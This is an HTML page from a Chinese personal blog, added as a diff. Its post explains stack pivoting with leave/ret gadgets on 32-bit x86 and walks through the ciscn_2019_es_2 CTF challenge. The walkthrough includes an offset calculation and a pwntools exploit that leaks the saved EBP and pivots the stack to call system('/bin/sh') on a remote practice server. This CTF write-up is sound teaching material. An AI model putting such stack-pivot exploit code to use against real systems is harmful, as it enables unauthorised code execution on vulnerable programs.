@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,栈迁移,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="先说结论：当return address向后溢出的长度无法满足构造的rop链的时候就会用到栈迁移。栈迁移就是利用两个LEAVE/RETN指令，实现ESP、EBP和EIP的控制。第一个POP EBP指令跳去攻击者想要跳去的地址，第二个LEAVE指令用于将ESP指向攻击者设置好的EBP，这样就完成了栈的迁移。随后的POP EBP并不会对EBP造成影响，只是ESP指向了ESP+4。RETN（即POP E">
+<meta name="keywords" content="pwn,栈迁移">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移">
+<meta property="og:url" content="http://yoursite.com/2022/01/10/栈迁移/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="先说结论：当return address向后溢出的长度无法满足构造的rop链的时候就会用到栈迁移。栈迁移就是利用两个LEAVE/RETN指令，实现ESP、EBP和EIP的控制。第一个POP EBP指令跳去攻击者想要跳去的地址，第二个LEAVE指令用于将ESP指向攻击者设置好的EBP，这样就完成了栈的迁移。随后的POP EBP并不会对EBP造成影响，只是ESP指向了ESP+4。RETN（即POP E">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/step1.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/ciscn_hack.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/ciscn_main.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/ciscn_vul.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/ropgadget.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/nop.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/定位.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/payload构造.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/system1.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/system2.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/10/栈迁移/flag.png">
+<meta property="og:updated_time" content="2022-04-24T01:34:55.030Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈迁移">
+<meta name="twitter:description" content="先说结论：当return address向后溢出的长度无法满足构造的rop链的时候就会用到栈迁移。栈迁移就是利用两个LEAVE/RETN指令，实现ESP、EBP和EIP的控制。第一个POP EBP指令跳去攻击者想要跳去的地址，第二个LEAVE指令用于将ESP指向攻击者设置好的EBP，这样就完成了栈的迁移。随后的POP EBP并不会对EBP造成影响，只是ESP指向了ESP+4。RETN（即POP E">
+<meta name="twitter:image" content="http://yoursite.com/2022/01/10/栈迁移/step1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/01/10/栈迁移/">
+
+
+
+
+
+  <title>栈迁移 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/01/10/栈迁移/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">栈迁移</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-10T21:15:32+08:00">
+                2022-01-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>先说结论：<br>当return address向后溢出的长度无法满足构造的rop链的时候就会用到栈迁移。<br>栈迁移就是利用两个LEAVE/RETN指令，实现ESP、EBP和EIP的控制。第一个POP EBP指令跳去攻击者想要跳去的地址，第二个LEAVE指令用于将ESP指向攻击者设置好的EBP，这样就完成了栈的迁移。随后的POP EBP并不会对EBP造成影响，只是ESP指向了ESP+4。RETN（即POP EIP）控制EIP指向ESP栈顶位置，就是我们shellcode的地址。随后可以开始执行shellcode了。<br><a id="more"></a><br>首先了解一下函数调用过程中栈的变化，汇编伪代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUSH arga//参数a入栈</span><br><span class="line">PUSH argb//参数b入栈</span><br><span class="line">CALL func</span><br><span class="line">ADD ESP,8h//平衡堆栈</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func:</span><br><span class="line">PUSH EBP //保存函数调用前的EBP</span><br><span class="line">MOV EBP,ESP //令EBP指向ESP的地址，即原ESP作为新EBP</span><br><span class="line">SUB ESP,48h//开辟func函数的栈空间</span><br><span class="line">xxxxx</span><br><span class="line">MOV ESP,EBP//令ESP指向EBP的地址，即恢复为函数开辟的栈空间。</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure></p>
+<p>展开来讲，CALL和RETN指令的本质都是修改EIP。<br>CALL指令的本质就是将CALL下一条指令压栈（同时ESP的值也要减4），然后将func函数的地址传给EIP。即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUSH EIP+4</span><br><span class="line">MOV EIP,[func]</span><br></pre></td></tr></table></figure></p>
+<p>而RETN指令的本质，是将栈顶指针弹出传给EIP（同时ESP的值也要加4），也就是此时EIP指向[ESP-4]。即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP EIP</span><br></pre></td></tr></table></figure></p>
+<p>这样看来，上面的指令就变成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUSH arga</span><br><span class="line">PUSH argb</span><br><span class="line">PUSH EBP+4</span><br><span class="line">MOV EIP,[func]</span><br><span class="line">ADD ESP,8h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func:</span><br><span class="line">PUSH EBP</span><br><span class="line">MOV EBP,ESP</span><br><span class="line">SUB ESP,48h</span><br><span class="line">xxxxx</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">POP EIP</span><br></pre></td></tr></table></figure></p>
+<p>函数调用结束刚好是函数调用开始的逆过程，用于恢复堆栈。</p>
+<p>知道了这些之后，可以再返回看一下我们开头的结论部分，大概有数之后，就可以继续看栈迁移具体的实现流程了。<br>设攻击者想要跳转到的地址为shellcoed_addr，另一处LEAVE/RETN的地址为gadget_addr。</p>
+<ol>
+<li>利用缓冲区溢出，覆盖原函数的LEAVE和RETN两处分别为[shellcoed_addr+4]和gadget_addr。<br><img src="/2022/01/10/栈迁移/step1.png" alt></li>
+<li>函数执行到POP EBP这条指令的时候，EBP被修改成了[shellcoed_addr+4]。此时ESP下移，</li>
+<li>继续执行RETN（POP EIP），EIP被修改成了gadget_addr。</li>
+<li>执行gadget_addr的内容，即<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这时候<code>MOV ESP,EBP</code>会将ESP也指向[shellcoed_addr-4]。<br><code>POP EBP</code>将栈顶指针传给EBP，栈顶指针ESP原本就是[shellcoed_addr-4]，所以没有实质影响。执行完后ESP指向[shellcoed_addr]。这时候，<code>RETN</code>即<code>POP EIP</code>将ESP当前的地址[shellcoed_addr]弹出给EIP。这样就实现了控制EIP。</p>
+<p>注：ESP在进行了两个POP指令之后会比EBP地址大，但这并不影响，我们要做的是控制EIP。</p>
+<p>以几道题为例。</p>
+<ol>
+<li>ciscn_2019_es_2 from buuoj<br>checksec一下<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">seclab@seclabPC:/home/PycharmProjectspy2/pwn$ checksec ./ciscn</span><br><span class="line">[*] '/home/PycharmProjectspy2/pwn/ciscn'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>开启了NX保护，是32位程序。</p>
+<p>拖进ida中查看一下。<br>发现了函数列表中有个hack函数，进去发现了system函数。但是没有/bin/sh，需要自己填入。<br><img src="/2022/01/10/栈迁移/ciscn_hack.png" alt><br>这是主函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome, my friend. What's your name?"</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/10/栈迁移/ciscn_main.png" alt><br>跟进vul函数查看函数里面是什么<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2022/01/10/栈迁移/ciscn_vul.png" alt><br>可以看到一个长度为0x28的数组，memset对它进行初始化清零。<br>read函数只能读入0x30个字节，s的首地址距离ebp有0x28个字节。所以只能溢出0x30-0x28=8个字节。而一个地址四个字节，所以只能覆盖old ebp和retn。可以使用栈迁移来解决栈溢出空间不足的问题。<br>查找一下栈迁移需要的leave_ret指令。<br><img src="/2022/01/10/栈迁移/ropgadget.png" alt><br>同时没有查找到bin/sh串，这个参数需要我们传入。<br>我们可以将目标地址设置在s数组的内存区域。既然如此，首先我们需要知道s数组的首地址距离old_ebp的距离。这样就可以定位新的ebp和作为payload传入的/bin/sh的地址。<br>下面就来确定偏移。<br>注意到，read函数后是printf函数，printf具有不遇到\0就会一直输出的特点，所以可以利用这一点来泄露old_ebp的地址。<br>同时在ida中看到，距离vul函数的leave_ret最近的地方有一个nop指令，可以把断点下在这里，方便进行调试和查看堆栈状态。<br><img src="/2022/01/10/栈迁移/nop.png" alt><br>提示输入，输入两次后查看堆栈。<br><img src="/2022/01/10/栈迁移/定位.png" alt><br>0xd018-0xcff0=0x38，说明我们输入的参数距离old_ebp的距离是0x38字节。<br>另外，由于leave指令会pop ebp，将esp地址拉高4个字节，所以需要aaaa打头来平衡，pop掉aaaa后，esp将会指向system的地址，再pop给eip的就是system的地址了。<br>这样就可以构造payload。<br><img src="/2022/01/10/栈迁移/payload构造.png" alt><br>计算得到old_ebp-0x38+0x4×4=old_ebp-0x28，即传入的binsh串的首地址是old_ebp-0x28。<br>定位system函数：<br><img src="/2022/01/10/栈迁移/system1.png" alt><br><img src="/2022/01/10/栈迁移/system2.png" alt><br>写出exp：<br>（注意应使用pwntools中的 send 而非 sendline，否则payload末尾会附上终止符导致无法连带打印出栈上内容）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>, <span class="number">26038</span>)</span><br><span class="line">system_addr = <span class="number">0x8048400</span></span><br><span class="line">gadget_leave_ret_addr = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x24</span>+<span class="string">'b'</span>*<span class="number">0x4</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">old_ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">'b'</span>*<span class="number">0x4</span>+p32(old_ebp<span class="number">-0x28</span>)+<span class="string">"/bin/sh"</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload2 += p32(old_ebp<span class="number">-0x38</span>)+p32(gadget_leave_ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/10/栈迁移/flag.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/栈迁移/" rel="tag"># 栈迁移</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/04/红日靶场内网穿透练习/" rel="next" title="红日靶场内网穿透练习">
+                <i class="fa fa-chevron-left"></i> 红日靶场内网穿透练习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/03/15/Win10内核调试/" rel="prev" title="Win10内核调试">
+                Win10内核调试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
